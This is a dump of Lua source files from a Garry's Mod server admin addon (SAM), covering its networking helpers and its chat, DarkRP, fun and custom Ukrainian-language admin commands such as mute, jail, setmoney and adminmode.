		return Entity(v)
	end,
	[EXT_PLAYER] = function(v)
		return Player(v)
	end,
	[EXT_VECTOR] = function(v)
		return Vector(v[1], v[2], v[3])
	end,
	[EXT_ANGLE] = function(v)
		return Angle(v[1], v[2], v[3])
	end,
	[EXT_COLOR] = function(v)
		return Color(v[1], v[2], v[3], v[4])
	end,
	[EXT_CONSOLE] = function(v)
		return sam.console
	end
}

mp.build_ext = function(tag, data)
	local f = mp.unpacker(data)
	local _, v = f()
	return unpackers[tag](v)
end

sam.mp = mp

--PATH addons/____sam/lua/sam/libs/sh_async_netstream.lua:
if SAM_LOADED then return end

local netstream = sam.netstream
netstream.async = {}

if SERVER then
	local IsValid = IsValid
	function netstream.async.Hook(name, fn, check)
		netstream.Hook(name, function(ply, i, ...)
			if not sam.isnumber(i) then return end
			local res = function(...)
				if IsValid(ply) then
					netstream.Start(ply, name, i, ...)
				end
			end
			fn(res, ply, ...)
		end, check)
	end
else
	local count = 0
	local receivers = {}

	local hook_fn = function(i, ...)
		local receiver = receivers[i]
		if receiver[2] then
			receiver[2]()
		end
		receiver[1]:resolve(...)
		receivers[i] = nil
	end

	function netstream.async.Start(name, func_to_call, ...)
		local promise = sam.Promise.new()
		count = count + 1
		receivers[count] = {promise, func_to_call}
		netstream.Hook(name, hook_fn)
		if func_to_call then
			func_to_call()
		end
		netstream.Start(name, count, ...)
		return promise
	end
end
--PATH addons/____sam/lua/sam/libs/sh_globals.lua:
if SAM_LOADED then return end

local sam, netstream = sam, sam.netstream

local globals

if SERVER then
	globals = {}
	local order = {}

	local get_order_key = function(key)
		for i = 1, #order do
			if order[i] == key then
				return i
			end
		end
	end

	function sam.set_global(key, value, force)
		if force or globals[key] ~= value then
			globals[key] = value

			if value ~= nil then
				if not get_order_key(key) then
					table.insert(order, key)
				end
			else
				local i = get_order_key(key)
				if i then
					table.remove(order, i)
				end
			end

			netstream.Start(nil, "SetGlobal", key, value)
		end
	end

	hook.Add("SAM.PlayerNetReady", "SAM.SendGlobals", function(ply)
		netstream.StartCompressed(ply, "SendGlobals", globals, order)
	end)
end

if CLIENT then
	function sam.set_global(key, value)
		if globals then
			globals[key] = value
			hook.Call("SAM.ChangedGlobalVar", nil, key, value)
		end
	end
	netstream.Hook("SetGlobal", sam.set_global)

	netstream.Hook("SendGlobals", function(vars, order)
		globals = vars

		for _, key in ipairs(order) do
			hook.Call("SAM.ChangedGlobalVar", nil, key, vars[key])
		end
	end)
end

function sam.get_global(key, default)
	if globals then
		local value = globals[key]
		if value ~= nil then
			return value
		end
	end

	return default
end

--PATH addons/____sam/lua/sam/player/sh_nw_vars.lua:
if SAM_LOADED then return end

local netstream = sam.netstream

local nwvars = {}

if SERVER then
	function sam.player.set_nwvar(ply, key, value, force)
		local id = ply:EntIndex()
		if not nwvars[id] then
			nwvars[id] = {}
		end
		if force or nwvars[id][key] ~= value then
			nwvars[id][key] = value
			netstream.Start(nil, "SetNWVar", id, key, value)
		end
	end
end

if CLIENT then
	function sam.player.set_nwvar(ply, key, value)
		local id_vars = nwvars[ply:EntIndex()]
		id_vars[key] = value
	end

	netstream.Hook("SetNWVar", function(id, key, value)
		local id_vars = nwvars[id]
		if id_vars == nil then
			nwvars[id] = {
				[key] = value
			}
		else
			id_vars[key] = value
		end
	end)

	netstream.Hook("SendNWVars", function(vars)
		nwvars = vars
	end)

	netstream.Hook("RemoveNWVar", function(id)
		nwvars[id] = nil
	end)
end

function sam.player.get_nwvar(ply, key, default)
	local value = nwvars[ply:EntIndex()]
	if value then
		value = value[key]
		if value ~= nil then
			return value
		end
	end
	return default
end

if SERVER then
	hook.Add("OnEntityCreated", "SAM.NWVars", function(ent)
		if ent:IsPlayer() and ent:IsValid() then
			nwvars[ent:EntIndex()] = {}
		end
	end)

	hook.Add("SAM.PlayerNetReady", "SAM.SendNWVars", function(ply)
		netstream.Start(ply, "SendNWVars", nwvars)
	end)

	hook.Add("EntityRemoved", "SAM.RemoveNWVars", function(ent)
		if ent:IsPlayer() then
			local id = ent:EntIndex()
			nwvars[id] = nil
			netstream.Start(nil, "RemoveNWVar", id)
		end
	end)
end

--PATH addons/____sam/lua/sam/player/cl_player.lua:
if SAM_LOADED then return end

local sam = sam
local netstream = sam.netstream

netstream.Hook("PlaySound", function(sound)
	surface.PlaySound(sound)
end)
--PATH addons/____sam/lua/sam/command/arguments/rank.lua:
if SAM_LOADED then return end

local sam, command = sam, sam.command

local is_good_rank = function(rank, arg, ply)
	if arg.check and not arg.check(rank, ply) then
		return false
	end
	return true
end

command.new_argument("rank")
	:OnExecute(function(arg, input, ply, _, result, i)
		if not input and arg.optional then
			result[i] = nil
			return
		end

		if not sam.ranks.is_rank(input) or not is_good_rank(input, arg, ply) then
			ply:sam_send_message("invalid", {
				S = arg.hint or "rank", S_2 = input
			})
			return false
		end

		result[i] = input
	end)

	:Menu(function(set_result, body, buttons, arg)
		local current_rank = arg.hint or "select rank"

		local ranks = buttons:Add("SAM.ComboBox")
		ranks:SetValue(current_rank)
		ranks:SetTall(25)

		function ranks:OnSelect(_, value)
			set_result(value)
			current_rank = value
		end

		function ranks:DoClick()
			if self:IsMenuOpen() then
				return self:CloseMenu()
			end

			self:Clear()
			self:SetValue(current_rank)

			for rank_name in SortedPairsByMemberValue(sam.ranks.get_ranks(), "immunity", true) do
				if is_good_rank(rank_name, arg, LocalPlayer()) then
					self:AddChoice(rank_name)
				end
			end

			self:OpenMenu()
		end

		return ranks
	end)

	:AutoComplete(function(arg, result, name)
		for rank_name in SortedPairsByMemberValue(sam.ranks.get_ranks(), "immunity", true) do
			if rank_name:lower():find(name, 1, true) and is_good_rank(rank_name, arg, LocalPlayer()) then
				table.insert(result, rank_name)
			end
		end
	end)
:End()
--PATH addons/____sam/lua/sam/modules/chat.lua:
if SAM_LOADED then return end

local sam, command, language = sam, sam.command, sam.language

command.set_category("Chat")

command.new("pm")
	:SetPermission("pm", "user")

	:AddArg("player", {allow_higher_target = true, single_target = true, cant_target_self = true})
	:AddArg("text", {hint = "message", check = function(str)
		return str:match("%S") ~= nil
	end})

	:GetRestArgs()

	:Help("pm_help")

	:OnExecute(function(ply, targets, message)
		if ply:sam_get_pdata("unmute_time") then
			return ply:sam_send_message("you_muted")
		end

		local target = targets[1]

		ply:sam_send_message("pm_to", {
			T = targets, V = message
		})

		if ply ~= target then
			target:sam_send_message("pm_from", {
				A = ply, V = message
			})
		end

		hook.Run('playerPM', ply, target, message)
	end)
:End()

do
	sam.permissions.add("see_admin_chat", nil, "admin")

	local reports_enabled = sam.config.get_updated("Reports", true)
	command.new("asay")
		:SetPermission("asay", "user")

		:AddArg("text", {hint = "message"})
		:GetRestArgs()

		:Help("asay_help")

		:OnExecute(function(ply, message)
			if reports_enabled.value and not ply:HasPermission("see_admin_chat") then
				local success, time = sam.player.report(ply, message)
				if success == false then
					ply:sam_send_message("You need to wait {S Red} seconds.", {
						S = time
					})
				else
					ply:sam_send_message("to_admins", {
						A = ply, V = message
					})
				end
				return
			end

			local targets = {ply}

			local players = player.GetHumans()
			for i = 1, #players do
				local v = players[i]
				if v:HasPermission("see_admin_chat") and v ~= ply then
					table.insert(targets, v)
				end
			end

			sam.player.send_message(targets, "to_admins", {
				A = ply, V = message
			})
		end)
	:End()

	if SERVER then
		sam.hook_last("PlayerSay", "SAM.Chat.Asay", function(ply, text)
			if text:sub(1, 1) == "@" then
				ply:Say("!asay " .. text:sub(2))
				return ""
			end
		end)
	end
end

do
	command.new("mute")
		:SetPermission("mute", "admin")

		:AddArg("player")
		:AddArg("length", {optional = true, default = 0, min = 0})
		:AddArg("text", {hint = "reason", optional = true, default = sam.language.get("default_reason")})

		:GetRestArgs()

		:Help("mute_help")

		:OnExecute(function(ply, targets, length, reason)
			local current_time = SysTime()

			for i = 1, #targets do
				local target = targets[i]
				target:sam_set_pdata("unmute_time", length ~= 0 and (current_time + length * 60) or 0)
			end

			sam.player.send_message(nil, "mute", {
				A = ply, T = targets, V = sam.format_length(length), V_2 = reason
			})
		end)
	:End()

	command.new("unmute")
		:SetPermission("unmute", "admin")
		:AddArg("player", {optional = true})
		:Help("unmute_help")

		:OnExecute(function(ply, targets)
			for i = 1, #targets do
				targets[i]:sam_set_pdata("unmute_time", nil)
			end

			sam.player.send_message(nil, "unmute", {
				A = ply, T = targets
			})
		end)
	:End()

	if SERVER then
		sam.hook_first("PlayerSay", "SAM.Chat.Mute", function(ply, text)
			local unmute_time = ply:sam_get_pdata("unmute_time")
			if not unmute_time then return end

			if text:sub(1, 1) == "!" and text:sub(2, 2):match("%S") ~= nil then
				local args = sam.parse_args(text:sub(2))

				local cmd_name = args[1]
				if not cmd_name then return end

				local cmd = command.get_command(cmd_name)
				if cmd then
					return
				end
			end

			if unmute_time == 0 or unmute_time > SysTime() then
				return ""
			else
				ply:sam_set_pdata("unmute_time", nil)
			end
		end)
	end
end

do
	command.new("gag")
		:SetPermission("gag", "admin")

		:AddArg("player")
		:AddArg("length", {optional = true, default = 0, min = 0})
		:AddArg("text", {hint = "reason", optional = true, default = sam.language.get("default_reason")})

		:GetRestArgs()

		:Help("gag_help")

		:OnExecute(function(ply, targets, length, reason)
			for i = 1, #targets do
				local target = targets[i]
				target.sam_gagged = true
				if length ~= 0 then
					timer.Create("SAM.UnGag" .. target:SteamID64(), length * 60, 1, function()
						RunConsoleCommand("sam", "ungag", "#" .. target:EntIndex())
					end)
				end
			end

			sam.player.send_message(nil, "gag", {
				A = ply, T = targets, V = sam.format_length(length), V_2 = reason
			})
		end)
	:End()

	command.new("ungag")
		:SetPermission("ungag", "admin")

		:AddArg("player", {optional = true})
		:Help("ungag_help")

		:OnExecute(function(ply, targets)
			for i = 1, #targets do
				local target = targets[i]
				target.sam_gagged = nil
				timer.Remove("SAM.UnGag" .. target:SteamID64())
			end

			sam.player.send_message(nil, "ungag", {
				A = ply, T = targets
			})
		end)
	:End()

	if SERVER then
		hook.Add("PlayerCanHearPlayersVoice", "SAM.Chat.Gag", function(_, ply)
			if ply.sam_gagged then
				return false
			end
		end)

		hook.Add("SAM.AuthedPlayer", "SAM.Gag", function(ply)
			local gag_time = ply:sam_get_pdata("gagged")
			if gag_time then
				ply:sam_set_pdata("gagged", nil)
				RunConsoleCommand("sam", "gag", "#" .. ply:EntIndex(), gag_time / 60, "LTAP")
			end
		end)

		hook.Add("PlayerDisconnected", "SAM.Gag", function(ply)
			if ply.sam_gagged then
				ply:sam_set_pdata("gagged", timer.TimeLeft("SAM.UnGag" .. ply:SteamID64()) or 0)
			end
		end)
	end
end
--PATH addons/____sam/lua/sam/modules/darkrp.lua:
if SAM_LOADED then return end

local add = not GAMEMODE and hook.Add or function(_, _, fn)
	fn()
end

add("PostGamemodeLoaded", "SAM.DarkRP", function()
	if not DarkRP then return end

	local sam, command, language = sam, sam.command, sam.language

	command.set_category("DarkRP")

	command.new("arrest")
		:SetPermission("arrest", "superadmin")

		:AddArg("player")

		:Help("arrest_help")

		:OnExecute(function(ply, targets)
			for i = 1, #targets do
				local v = targets[i]
				if v:onyx_GetNetVar('Arrest') then
					v:UnArrest()
				end
				v:Arrest()
			end

			sam.player.send_message(nil, "arrest", {
				A = ply, T = targets
			})
		end)
	:End()

	command.new("unarrest")
		:SetPermission("unarrest", "superadmin")

		:AddArg("player", {optional = true})

		:Help("unarrest_help")

		:OnExecute(function(ply, targets)
			for i = 1, #targets do
				targets[i]:UnArrest()
			end

			sam.player.send_message(nil, "unarrest", {
				A = ply, T = targets
			})
		end)
	:End()

	command.new("setmoney")
		:SetPermission("setmoney", "superadmin")

		:AddArg("player", {single_target = true})
		:AddArg("number", {hint = "amount", min = 0, round = true})

		:Help("setmoney_help")

		:OnExecute(function(ply, targets, amount)
			local target = targets[1]

			target:SetMoney(amount)
			sam.player.send_message(nil, "setmoney", {
				A = ply, T = targets, V = amount
			})
		end)
	:End()

	command.new("addmoney")
		:SetPermission("addmoney", "superadmin")

		:AddArg("player", {single_target = true})
		:AddArg("number", {hint = "amount", round = true})

		:Help("addmoney_help")

		:OnExecute(function(ply, targets, amount)
			targets[1]:addMoney(amount)

			sam.player.send_message(nil, "addmoney", {
				A = ply, T = targets, V = rp.FormatMoney(amount)
			})
		end)
	:End()

	command.new("sellall")
		:SetPermission("sellall", "superadmin")

		:AddArg("player", {single_target = true})

		:Help("sellall_help")

		:OnExecute(function(ply, targets, amount)
			local target = targets[1]

			if (target:onyx_GetNetVar('doorCount') or 0) <= 0 then
				rp.Notify(ply, NOTIFY_ERROR, "У нього немає дверей для продажу.","")
				return
			end
			local count = target:onyx_GetNetVar('doorCount') or 0
			local amt = (count * rp.Setting.DoorCostMin)
			target:DoorUnOwnAll()
			target:AddMoney(amt)

			sam.player.send_message(nil, "sellall", {
				A = ply, T = targets
			})
		end)
	:End()

	local job_index = nil

	command.new("setjob")
		:SetPermission("setjob", "admin")

		:AddArg("player")
		:AddArg("text", {hint = "job", check = function(job)
			job = job:lower()

			for _, v in pairs(rp.Team) do
				if v.name:lower() == job or v.Command:lower() == job then
					job_index = v.team
					return true
				end
			end

			return false
		end})

		:Help("setjob_help")

		:OnExecute(function(ply, targets, job)
			for i = 1, #targets do
				targets[i]:SetTeams(job_index,2,false)
			end

			sam.player.send_message(nil, "setjob", {
				A = ply, T = targets, V = job
			})
		end)
	:End()

	sam.command.new("forcename")
		:SetPermission("forcename", "superadmin")

		:AddArg("player")
		:AddArg("text", {hint = "name"})

		:Help("forcename_help")

		:OnExecute(function(ply, targets, name)
			local target = targets[1]

			name = string.Trim(name)

			if string.len(name) > 50 then
				rp.notify(self,'Ім\'я досить довге.')
				return false
			end

			if string.len(name) < 2 then
				rp.notify(self,'Ім\'я досить коротке.')
				return false
			end

			target:SetRPName(name)

			sam.player.send_message(nil, "forcename", {
				A = ply, T = targets, V = name
			})
		end)
	:End()
end)
--PATH addons/____sam/lua/sam/modules/fun.lua:
if SAM_LOADED then return end

local sam, command, language = sam, sam.command, sam.language

command.set_category("Fun")

do
	local sounds = {}
	for i = 1, 6 do
		sounds[i] = "physics/body/body_medium_impact_hard" .. i .. ".wav"
	end

	local slap = function(ply, damage, admin)
		if not ply:Alive() or ply:sam_get_nwvar("frozen") then return end
		ply:ExitVehicle()

		ply:SetVelocity(Vector(math.random(-100, 100), math.random(-100, 100), math.random(200, 400)))
		ply:EmitSound(sounds[math.random(1, 6)], 60, math.random(80, 120))

		if damage > 0 then
			ply:TakeDamage(damage, admin, DMG_GENERIC)
		end
	end

	command.new("slap")
		:SetPermission("slap", "admin")

		:AddArg("player")
		:AddArg("number", {hint = "damage", round = true, optional = true, min = 0, default = 0})

		:Help("slap_help")

		:OnExecute(function(ply, targets, damage)
			for i = 1, #targets do
				slap(targets[i], damage, ply)
			end

			if damage > 0 then
				sam.player.send_message(nil, "slap_damage", {
					A = ply, T = targets, V = damage
				})
			else
				sam.player.send_message(nil, "slap", {
					A = ply, T = targets
				})
			end
		end)
	:End()
end

command.new("slay")
	:SetPermission("slay", "admin")

	:AddArg("player")

	:Help("slay_help")

	:OnExecute(function(ply, targets)
		for i = 1, #targets do
			local v = targets[i]
			if not v:sam_get_exclusive(ply) then
				v:Kill()
			end
		end

		sam.player.send_message(nil, "slay", {
			A = ply, T = targets
		})
	end)
:End()

command.new("hp")
	:Aliases("sethp", "health", "sethealth")

	:SetPermission("hp", "admin")

	:AddArg("player")
	:AddArg("number", {hint = "amount", min = 1, max = 2147483647, round = true, optional = true, default = 100})

	:Help("hp_help")

	:OnExecute(function(ply, targets, amount)
		for i = 1, #targets do
			targets[i]:SetHealth(amount)
		end

		sam.player.send_message(nil, "set_hp", {
			A = ply, T = targets, V = amount
		})
	end)
:End()

command.new("armor")
	:Aliases("setarmor")

	:SetPermission("armor", "admin")

	:AddArg("player")
	:AddArg("number", {hint = "amount", min = 1, max = 2147483647, round = true, optional = true, default = 100})

	:Help("armor_help")

	:OnExecute(function(ply, targets, amount)
		for i = 1, #targets do
			targets[i]:SetArmor(amount)
		end

		sam.player.send_message(nil, "set_armor", {
			A = ply, T = targets, V = amount
		})
	end)
:End()

command.new("god")
	:Aliases("invincible")

	:SetPermission("god", "admin")

	:AddArg("player", {optional = true})

	:Help("god_help")

	:OnExecute(function(ply, targets)
		for i = 1, #targets do
			local target = targets[i]
			target:GodEnable()
			target.sam_has_god_mode = true
		end

		sam.player.send_message(nil, "god", {
			A = ply, T = targets
		})
	end)
:End()

command.new("ungod")
	:Aliases("uninvincible")

	:SetPermission("ungod", "admin")

	:AddArg("player", {optional = true})

	:Help("ungod_help")

	:OnExecute(function(ply, targets)
		for i = 1, #targets do
			local target = targets[i]
			target:GodDisable()
			target.sam_has_god_mode = nil
		end

		sam.player.send_message(nil, "ungod", {
			A = ply, T = targets
		})
	end)
:End()

do
	command.new("freeze")
		:SetPermission("freeze", "admin")

		:AddArg("player")

		:Help("freeze_help")

		:OnExecute(function(ply, targets)
			for i = 1, #targets do
				local v = targets[i]
				v:ExitVehicle()
				if v:sam_get_nwvar("frozen") then
					v:UnLock()
				end
				v:Lock()
				v:sam_set_nwvar("frozen", true)
				v:sam_set_exclusive("frozen")
			end

			sam.player.send_message(nil, "freeze", {
				A = ply, T = targets
			})
		end)
	:End()

	command.new("unfreeze")
		:SetPermission("unfreeze", "admin")

		:AddArg("player", {optional = true})

		:Help("unfreeze_help")

		:OnExecute(function(ply, targets)
			for i = 1, #targets do
				local v = targets[i]
				v:UnLock()
				v:sam_set_nwvar("frozen", false)
				v:sam_set_exclusive(nil)
			end

			sam.player.send_message(nil, "unfreeze", {
				A = ply, T = targets
			})
		end)
	:End()

	local disallow = function(ply)
		if ply:sam_get_nwvar("frozen") then
			return false
		end
	end

	for _, v in ipairs({"SAM.CanPlayerSpawn", "CanPlayerSuicide", "CanTool"}) do
		hook.Add(v, "SAM.FreezePlayer." .. v, disallow)
	end
end

command.new("cloak")
	:SetPermission("cloak", "admin")

	:AddArg("player", {optional = true})

	:Help("cloak_help")

	:OnExecute(function(ply, targets)
		for i = 1, #targets do
			targets[i]:sam_cloak()
		end

		sam.player.send_message(nil, "cloak", {
			A = ply, T = targets
		})
	end)
:End()

command.new("uncloak")
	:SetPermission("uncloak", "admin")

	:AddArg("player", {optional = true})

	:Help("uncloak_help")

	:OnExecute(function(ply, targets)
		for i = 1, #targets do
			targets[i]:sam_uncloak()
		end

		sam.player.send_message(nil, "uncloak", {
			A = ply, T = targets
		})
	end)
:End()

do
	local jail_props = {
		Vector(0, 0, -5), Angle(90, 0, 0);
		Vector(0, 0, 97), Angle(90, 0, 0);

		Vector(21, 31, 46), Angle(0, 90, 0);
		Vector(21, -31, 46), Angle(0, 90, 0);
		Vector(-21, 31, 46), Angle(0, 90, 0);
		Vector(-21, -31, 46), Angle(0, 90, 0);

		Vector(-52, 0, 46), Angle(0, 0, 0);
		Vector(52, 0, 46), Angle(0, 0, 0)
	}

	local remove_jail = function(ply_jail_props)
		for _, jail_prop in ipairs(ply_jail_props) do
			if IsValid(jail_prop) then
				jail_prop:Remove()
			end
		end
	end

	local unjail = function(ply)
		if not IsValid(ply) then return end
		if not ply:sam_get_nwvar("jailed") then return end

		remove_jail(ply.sam_jail_props)

		ply.sam_jail_props = nil
		ply.sam_jail_pos = nil

		ply:sam_set_nwvar("jailed", nil)
		ply:sam_set_exclusive(nil)

		timer.Remove("SAM.Unjail." .. ply:SteamID())
		timer.Remove("SAM.Jail.Watch." .. ply:SteamID())
	end

	local return_false = function()
		return false
	end

	local function jail(ply, time)
		if not IsValid(ply) then return end
		if not isnumber(time) or time < 0 then
			time = 0
		end

		if ply:sam_get_nwvar("frozen") then
			RunConsoleCommand("sam", "unfreeze", "#" .. ply:EntIndex())
		end

		if not ply:sam_get_nwvar("jailed") or (not ply.sam_jail_props or not IsValid(ply.sam_jail_props[1])) then
			ply:ExitVehicle()
			ply:SetMoveType(MOVETYPE_WALK)

			ply.sam_jail_pos = ply:GetPos()

			ply:sam_set_nwvar("jailed", true)
			ply:sam_set_exclusive("in jail")

			if ply.sam_jail_props then
				for k, v in ipairs(ply.sam_jail_props) do
					if IsValid(v) then
						v:Remove()
					end
				end
			end

			local ply_jail_props = {}
			for i = 1, #jail_props, 2 do
				local jail_prop = ents.Create("prop_physics")
				jail_prop:SetModel("models/props_building_details/Storefront_Template001a_Bars.mdl")
				jail_prop:SetPos(ply.sam_jail_pos + jail_props[i])
				jail_prop:SetAngles(jail_props[i + 1])
				jail_prop:SetMoveType(MOVETYPE_NONE)
				jail_prop:Spawn()
				jail_prop:GetPhysicsObject():EnableMotion(false)
				jail_prop.CanTool = return_false
				jail_prop.PhysgunPickup = return_false
				jail_prop.jailWall = true
				table.insert(ply_jail_props, jail_prop)
			end
			ply.sam_jail_props = ply_jail_props
		end

		local steamid = ply:SteamID()

		if time == 0 then
			timer.Remove("SAM.Unjail." .. steamid)
		else
			timer.Create("SAM.Unjail." .. steamid, time, 1, function()
				if IsValid(ply) then
					unjail(ply)
				end
			end)
		end

		timer.Create("SAM.Jail.Watch." .. steamid, 0.5, 0, function()
			if not IsValid(ply) then
				return timer.Remove("SAM.Jail.Watch." .. steamid)
			end

			if ply:GetPos():DistToSqr(ply.sam_jail_pos) > 4900 then
				ply:SetPos(ply.sam_jail_pos)
			end

			if not IsValid(ply.sam_jail_props[1]) then
				jail(ply, timer.TimeLeft("SAM.Unjail." .. steamid) or 0)
			end
		end)
	end

	command.new("jail")
		:SetPermission("jail", "admin")

		:AddArg("player")
		:AddArg("length", {optional = true, default = 0, min = 0})
		:AddArg("text", {hint = "reason", optional = true, default = sam.language.get("default_reason")})

		:GetRestArgs()

		:Help("jail_help")

		:OnExecute(function(ply, targets, length, reason)
			for i = 1, #targets do
				jail(targets[i], length * 60)
			end

			sam.player.send_message(nil, "jail", {
				A = ply, T = targets, V = sam.format_length(length), V_2 = reason
			})
		end)
	:End()

	command.new("unjail")
		:SetPermission("unjail", "admin")

		:AddArg("player", {optional = true})

		:Help("unjail_help")

		:OnExecute(function(ply, targets)
			for i = 1, #targets do
				unjail(targets[i])
			end

			sam.player.send_message(nil, "unjail", {
				A = ply, T = targets
			})
		end)
	:End()

	sam.hook_first("CanProperty", "SAM.Jail", function(_, property, ent)
		if ent.jailWall and property == "remover" then
			return false
		end
	end)

	if SERVER then
		hook.Add("PlayerSpawn", "SAM.Jail", function(ply)
			if ply:sam_get_nwvar("jailed") or ply:sam_get_pdata("jailed") then
				if ply.sam_jail_pos then
					ply:SetPos(ply.sam_jail_pos)
				else
					ply:SetPos(ply:sam_get_pdata("jail_pos"))
					jail(ply, ply:sam_get_pdata("jail_time_left"))

					ply:sam_set_pdata("jailed", nil)
					ply:sam_set_pdata("jail_pos", nil)
					ply:sam_set_pdata("jail_time_left", nil)
				end
			end
		end)

		hook.Add("PlayerEnteredVehicle", "SAM.Jail", function(ply)
			if ply:sam_get_nwvar("jailed") then
				ply:ExitVehicle()
			end
		end)

		hook.Add("PlayerDisconnected", "SAM.Jail", function(ply)
			if ply:sam_get_nwvar("jailed") then
				remove_jail(ply.sam_jail_props)

				ply:sam_set_pdata("jailed", true)
				ply:sam_set_pdata("jail_pos", ply.sam_jail_pos)
				ply:sam_set_pdata("jail_time_left", timer.TimeLeft("SAM.Unjail." .. ply:SteamID()) or 0)

				timer.Remove("SAM.Unjail." .. ply:SteamID())
				timer.Remove("SAM.Jail.Watch." .. ply:SteamID())
			end
		end)
	end

	local disallow = function(ply)
		if ply:sam_get_nwvar("jailed") then
			return false
		end
	end

	for _, v in ipairs({"PlayerNoClip", "SAM.CanPlayerSpawn", "CanPlayerEnterVehicle", "CanPlayerSuicide", "CanTool"}) do
		hook.Add(v, "SAM.Jail", disallow)
	end
end

command.new("strip")
	:SetPermission("strip", "admin")

	:AddArg("player")

	:Help("strip_help")

	:OnExecute(function(ply, targets)
		for i = 1, #targets do
			targets[i]:StripWeapons()
		end

		sam.player.send_message(nil, "strip", {
			A = ply, T = targets
		})
	end)
:End()

command.new("respawn")
	:SetPermission("respawn", "admin")

	:AddArg("player", {optional = true})

	:Help("respawn_help")

	:OnExecute(function(ply, targets)
		for i = 1, #targets do
			targets[i]:Spawn()
		end

		sam.player.send_message(nil, "respawn", {
			A = ply, T = targets
		})
	end)
:End()

command.new("setmodel")
	:SetPermission("setmodel", "superadmin")

	:AddArg("player")
	:AddArg("text", {hint = "model"})

	:Help("setmodel_help")

	:OnExecute(function(ply, targets, model)
		for i = 1, #targets do
			targets[i]:SetModel(model)
		end

		sam.player.send_message(nil, "setmodel", {
			A = ply, T = targets, V = model
		})
	end)
:End()

command.new("giveammo")
	:Aliases("ammo")

	:SetPermission("giveammo", "superadmin")

	:AddArg("player")
	:AddArg("number", {hint = "amount", min = 0, max = 99999})

	:Help("giveammo_help")

	:OnExecute(function(ply, targets, amount)
		if amount == 0 then
			amount = 99999
		end

		for i = 1, #targets do
			local target = targets[i]
			for _, wep in ipairs(target:GetWeapons()) do
				if wep:GetPrimaryAmmoType() ~= -1 then
					target:GiveAmmo(amount, wep:GetPrimaryAmmoType(), true)
				end

				if wep:GetSecondaryAmmoType() ~= -1 then
					target:GiveAmmo(amount, wep:GetSecondaryAmmoType(), true)
				end
			end
		end

		sam.player.send_message(nil, "giveammo", {
			A = ply, T = targets, V = amount
		})
	end)
:End()

do
	command.new("scale")
		:SetPermission("scale", "superadmin")

		:AddArg("player")
		:AddArg("number", {hint = "amount", optional = true, min = 0.1, max = 2.5, default = 1})

		:Help("scale_help")

		:OnExecute(function(ply, targets, amount)
			for i = 1, #targets do
				local v = targets[i]
				v:SetModelScale(amount)

				-- https://github.com/carz1175/More-ULX-Commands/blob/9b142ee4247a84f16e2dc2ec71c879ab76e145d4/lua/ulx/modules/sh/extended.lua#L313
				v:SetViewOffset(Vector(0, 0, 64 * amount))
				v:SetViewOffsetDucked(Vector(0, 0, 28 * amount))

				v.sam_scaled = true
			end

			sam.player.send_message(nil, "scale", {
				A = ply, T = targets, V = amount
			})
		end)
	:End()

	hook.Add("PlayerSpawn", "SAM.Scale", function(ply)
		if ply.sam_scaled then
			ply.sam_scaled = nil
			ply:SetViewOffset(Vector(0, 0, 64))
			ply:SetViewOffsetDucked(Vector(0, 0, 28))
		end
	end)
end

sam.command.new("freezeprops")
	:SetPermission("freezeprops", "admin")
	:Help("freezeprops_help")

	:OnExecute(function(ply)
		for _, prop in ipairs(ents.FindByClass("prop_physics")) do
			local physics_obj = prop:GetPhysicsObject()
			if IsValid(physics_obj) then
				physics_obj:EnableMotion(false)
			end
		end

		sam.player.send_message(nil, "freezeprops", {
			A = ply
		})
	end)
:End()
--PATH addons/____sam/lua/sam/modules/news.lua:
if SAM_LOADED then return end
--
CAMI.RegisterPrivilege({
    Name = "ukrp_isroot",
    MinAccess = "superadmin",
    Description = "IsRoot"
})

CAMI.RegisterPrivilege({
    Name = "ukrp_isvip",
    MinAccess = "admin",
    Description = "IsVIP"
})

CAMI.RegisterPrivilege({
    Name = "ukrp_adminmodenojob",
    MinAccess = "superadmin",
    Description = "AdminModeNoJob"
})

CAMI.RegisterPrivilege({
    Name = "ukrp_spawnmenu",
    MinAccess = "superadmin",
    Description = "SpawnMenu"
})

CAMI.RegisterPrivilege({
    Name = "ukrp_outfitter",
    MinAccess = "superadmin",
    Description = "Outfitter"
})

CAMI.RegisterPrivilege({
    Name = "ukrp_checknameanonim",
    MinAccess = "superadmin",
    Description = "CheckNameAnonim"
})

sam.permissions.add( 'cats_see_requests' )

local pMeta = FindMetaTable("Player")
function pMeta:IsRoot()
    return CAMI.PlayerHasAccess(self, "ukrp_isroot")
end

function pMeta:IsVIP()
    return CAMI.PlayerHasAccess(self, "ukrp_isvip")
end

local sam, command = sam, sam.command
--
command.set_category("NEW")
--
command.new("adminmode"):SetPermission("adminmode", "superadmin"):Help("adminmode_help"):OnExecute(function(ply)
    if CAMI.PlayerHasAccess(ply, "ukrp_adminmodenojob") or ply:Team() == TEAM_ADMIN then
        if ply:onyx_GetNetVar('adminmode') then
            sam.player.send_message(nil, "exitadminmode", {
                A = ply
            })

            ply:GodDisable()
        else
            sam.player.send_message(nil, "enteradminmode", {
                A = ply
            })

            ply:GodEnable()
        end

        ply:onyx_SetNetVar("adminmode", not ply:onyx_GetNetVar('adminmode'))
    else
        rp.notify(ply, 'У вас недостатньо прав')
    end
end):End()

hook.Add('OnPlayerChangedTeam', 'AdminMode', function(ply)
    ply:onyx_SetNetVar("adminmode", false)
    sam.player.uncloak(ply)
    ply:GodDisable()
end)
hook.Add('PlayerSpawn', 'AdminMode', function(ply)
    ply:onyx_SetNetVar("adminmode", false)
    sam.player.uncloak(ply)
    ply:GodDisable()
end)

--
command.new("setfood"):SetPermission("setfood", "superadmin"):AddArg("player"):AddArg("number", {
    hint = "hunger",
    optional = true,
    min = 0,
    max = 100,
    default = 0
}):Help("setfood_help"):OnExecute(function(ply, targets, hunger)
    for i = 1, #targets do
        local target = targets[1]
        target:SetHunger(hunger)
    end

    sam.player.send_message(nil, "setfood", {
        A = ply,
        T = targets,
        V = hunger
    })
end):End()

command.new("go"):SetPermission("go", "superadmin"):Help("tellall_help"):OnExecute(function(ply)
    local ent = ply:GetEyeTrace().Entity
    if IsValid(ent) and (ent:CPPIGetOwner() or ent.ItemOwner) then
        local owner = ent:CPPIGetOwner() or ent.ItemOwner
        rp.notify(ply, owner:Name() .. ' (' .. owner:SteamID() .. ') володіє цією Entity.')
    else
        rp.notify(ply, 'Ця Entity не має власника.')
    end
end):End()

command.new("pe"):SetPermission("pe", "superadmin"):Help("pe_help"):AddArg("steamid"):OnExecute(function(ply, steamtbl)
    ply:ConCommand('plogs "playerevents" "' .. steamtbl.steamid .. '"')
end):End()
--PATH addons/_outfitter/lua/autorun/setbodygroupdata.lua:
